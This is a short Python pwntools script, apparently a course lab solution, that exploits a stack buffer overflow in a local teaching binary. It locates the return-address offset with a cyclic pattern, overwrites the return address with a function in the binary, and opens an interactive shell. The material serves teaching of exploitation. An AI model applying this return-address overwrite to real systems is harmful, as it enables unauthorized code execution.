#!/usr/bin/env python3
"""Solution for Problem 0 (ret2func): return into a function already in the
binary (lecture 8-1, slide 6).

No libc address is needed -- foo() is linked into THIS binary at a fixed
address (-no-pie), so we read it straight from the ELF symbol table and
overwrite the return address with it. Compare with solve_ret2libc.py, which
does the same thing but the target function lives in libc instead.

Run:  cd example5 && make && python3 solution5/solve_ret2func.py
"""
import os
from pwn import *

context.update(arch="i386", os="linux", log_level="info")

HERE = os.path.dirname(os.path.abspath(__file__))


def runnable(path):
    """/vagrant vboxsf flakily drops the +x bit; always run from an ext4 copy."""
    import shutil, tempfile
    dst = os.path.join(tempfile.mkdtemp(), os.path.basename(path))
    shutil.copy(path, dst)
    os.chmod(dst, 0o755)
    return dst


BIN = runnable(os.path.join(HERE, "..", "ret2func"))
elf = ELF(os.path.join(HERE, "..", "ret2func"), checksec=False)


def find_offset():
    io = process(BIN)
    io.sendline(cyclic(200))
    io.wait()
    off = cyclic_find(io.corefile.eip)
    io.close()
    log.success("offset(buf -> return address) = %d", off)
    return off


def main():
    offset = find_offset()

    foo = elf.symbols["foo"]
    log.info("foo @ %#x (fixed: no PIE)", foo)

    io = process(BIN)
    io.recvuntil(b"overflow me:\n")
    payload = flat(b"A" * offset, foo)
    io.sendline(payload)
    log.success("ret2func -> foo() -- dropping a shell")
    io.sendline(b"id; echo PWNED")
    io.interactive()


if __name__ == "__main__":
    main()
